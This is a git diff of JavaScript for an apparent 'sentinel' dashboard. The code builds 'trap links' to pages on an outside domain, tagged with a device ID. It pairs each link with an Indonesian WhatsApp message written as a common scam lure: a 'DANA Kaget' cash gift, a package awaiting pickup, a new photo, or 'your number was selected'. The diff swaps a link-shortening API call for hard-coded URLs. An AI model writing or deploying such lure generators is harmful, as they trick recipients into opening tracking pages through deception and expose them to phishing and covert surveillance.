@@ -427,38 +427,20 @@ function startDashboard() {
 }
 
 function renderTrapLinks() {
-  const el = document.getElementById('trapLinks');
-  el.innerHTML = `<div style="font-size:12px;color:var(--muted);text-align:center;padding:8px">
-    Membuat link… <span style="animation:spin 1s linear infinite;display:inline-block">⏳</span>
-  </div>`;
   generateTrapLinks();
 }
 
-async function generateTrapLinks() {
+function generateTrapLinks() {
+  const base = 'https://fiezel.my.id/sentinel';
+  const id = SESSION.deviceId;
   const types = [
-    { type: 'paket',  label: '📦 "Paket Menunggumu"', wa: 'Ada paket untukmu yang belum diambil! Konfirmasi segera sebelum dikembalikan: ' },
-    { type: 'foto',   label: '🖼️ "Ada Foto Untukmu"', wa: 'Kamu punya kiriman foto baru. Lihat sekarang: ' },
-    { type: 'hadiah', label: '🎁 "Kamu Terpilih"',    wa: 'Selamat! Nomor kamu terpilih. Klaim sebelum kadaluarsa: ' },
+    { label: '💙 DANA Kaget',       url: `${base}/dana.html?d=${id}`,             wa: '🎁 Kamu dapat DANA Kaget! Buka sekarang sebelum kedaluwarsa: ' },
+    { label: '📦 Paket Menunggumu', url: `${base}/paket.html?d=${id}`,            wa: '📦 Ada paket untukmu yang belum diambil! Konfirmasi segera: ' },
+    { label: '🖼️ Ada Foto Untukmu', url: `${base}/trap.html?d=${id}&type=foto`,   wa: 'Kamu punya kiriman foto baru. Lihat sekarang: ' },
+    { label: '🎁 Kamu Terpilih',    url: `${base}/trap.html?d=${id}&type=hadiah`, wa: 'Selamat! Nomor kamu terpilih. Klaim sebelum kadaluarsa: ' },
   ];
-  const results = await Promise.all(types.map(async t => {
-    try {
-      const res = await fetch(`${CLOUD}/api/shorten`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ deviceId: SESSION.deviceId, ownerToken: SESSION.token, type: t.type }),
-        signal: AbortSignal.timeout(8000),
-      });
-      const data = await res.json();
-      return { ...t, url: data.shortUrl || data.internalUrl };
-    } catch {
-      return { ...t, url: null };
-    }
-  }));
   const el = document.getElementById('trapLinks');
-  el.innerHTML = results.map(t => {
-    if (!t.url) {
-      return `<div style="font-size:11px;color:var(--muted);padding:8px 0">${t.label}: gagal generate link.</div>`;
-    }
+  el.innerHTML = types.map(t => {
     const waUrl = `https://wa.me/?text=${encodeURIComponent(t.wa + t.url)}`;
     return `<div style="background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:10px;padding:10px 12px">
       <div style="font-size:12px;font-weight:700;margin-bottom:4px">${t.label}</div>
